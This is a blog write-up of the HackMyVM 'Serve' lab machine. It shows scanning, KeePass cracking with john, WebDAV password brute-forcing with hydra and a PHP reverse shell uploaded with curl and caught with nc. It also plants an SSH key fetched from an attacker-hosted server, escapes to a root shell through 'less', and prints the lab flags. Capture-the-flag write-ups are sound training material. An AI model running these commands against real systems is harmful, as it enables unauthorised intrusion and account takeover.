---
layout: post
author: canarinho
title:  "Serve"
date:   2021-12-31 12:32:26 AM -03
category: HackMyVM
---

[HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Serve)

## Nmap Results

{% highlight bash %}
Starting Nmap 7.92 ( [https://nmap.org](https://nmap.org/) ) at 2021-12-15 15:20 -03
Nmap scan report for serve (192.168.15.91)
Host is up (0.0021s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 9a:0c:75:5a:bb:bb:06:a2:9a:7d:be:91:ca:45:45:e4 (RSA)
|   256 07:7d:e7:0f:0b:5e:5a:90:e9:33:72:68:49:3b:f5:8c (ECDSA)
|_  256 6c:15:32:a7:42:e7:9f:da:63:66:7d:3a:be:fb:bf:14 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:26:02:2F (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
{% endhighlight %}

## FFUF Results for [http://192.168.15.90/](http://192.168.15.90/)

{% highlight bash %}
javascript              [Status: 301, Size: 319, Words: 20, Lines: 10]
notes.txt               [Status: 200, Size: 173, Words: 24, Lines: 12]
secrets                 [Status: 301, Size: 316, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]
webdav                  [Status: 401, Size: 460, Words: 42, Lines: 15]
{% endhighlight %}

### -> notes.txt

Hi teo,
the database with your credentials to access the resource are in the secret directory
(Don't forget to change X to your employee number)

regards
IT department


## FFUF Results for [http://192.168.15.90/secrets](http://192.168.15.90/secrets)


db.kdbx                 [Status: 200, Size: 2078, Words: 12, Lines: 15]
index.html              [Status: 200, Size: 7, Words: 1, Lines: 8]


## Cracking the password of "db.kdbx"

{% highlight bash %}
keepass2john db.kdbx > hashKeepass.txt
john --format=KeePass --wordlist=/usr/share/wordlists/rockyou.txt  hashKeepass.txt
{% endhighlight %}


dreams           (db)	<--- password


## Acessing db.kdbx


admin:w3bd4vXXX


Now we need to find the right employee number to fill the XXX.

{% highlight bash %}
crunch 9 9 -t w3bd4v%%% -o pass.dic
hydra -l admin -P pass.dic 192.168.15.91 http-get /webdav -f -I
{% endhighlight %}

Result


[80][http-get] host: 192.168.15.91   login: admin   password: w3bd4v513


## Submitting a reverse shell

{% highlight bash %}
curl -T reverse.php [http://192.168.15.91/webdav/](http://192.168.15.91/webdav/) --digest -u admin:w3bd4v513
nc -nvlp 4444
curl [http://192.168.15.91/webdav/reverse.php](http://192.168.15.91/webdav/reverse.php) --digest -u admin:w3bd4v513
{% endhighlight  %}

Checking the "sudo -l", it's possible to execute wget as teo.
So, upload a rsa key to teo

{% highlight bash %}
sudo -u teo wget [http://192.168.15.85:8000/id_rsa.pub](http://192.168.15.85:8000/id_rsa.pub) -O /home/teo/.ssh/authorized_keys
{% endhighlight  %}

Then, just login via ssh using teo user.


user.txt	--> 	ZHgKGiUPm7T7yyLDD9HnqXF3eIkLs6

## PrivEsc

{% highlight bash %}
sudo -l
{% endhighlight  %}


User teo may run the following commands on Serve:
(root) NOPASSWD: /usr/local/bin/bro


Executing "sudo /usr/local/bin/bro curl", note that the binary utilize "less" utility, so just run "!bash".
And there it is, you got root shell


root.txt	-->	vWiU6Ums1pmZAYX0QyXvkclyPZ4lyi
